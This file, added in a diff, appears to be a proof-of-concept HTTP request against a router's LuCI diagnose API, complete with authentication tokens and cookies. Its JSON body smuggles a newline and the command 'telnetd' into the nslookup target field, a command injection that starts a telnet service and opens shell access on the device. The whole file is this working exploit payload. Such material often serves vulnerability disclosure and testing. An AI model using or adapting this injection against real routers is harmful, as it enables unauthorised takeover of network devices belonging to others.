@@ -1,0 +1,15 @@
+POST /cgi-bin/luci/api/diagnose?auth=c0792e605326b4cac7e36e4dbe1dce90 HTTP/1.1
+Host: 192.168.110.1
+Content-Length: 103
+Accept: application/json, text/plain, */*
+Content-Accept: 687084ab7c1bc47057547ad41eb0d446
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Origin: http://192.168.110.1
+Referer: http://192.168.110.1/cgi-bin/luci/;stok=7c52d4b51e60cd3c2204aa55b2ee2a6e/admin/alone/diagnose/diagnose_tool
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: G1SU1U6130963=c0792e605326b4cac7e36e4dbe1dce90; __APP_LANG__=zh_cn
+Connection: close
+
+{"method":"nslookup","params":{"type":"3","count":"4","size":"64","ttl":"20","target":"wwww\ntelnetd"}}
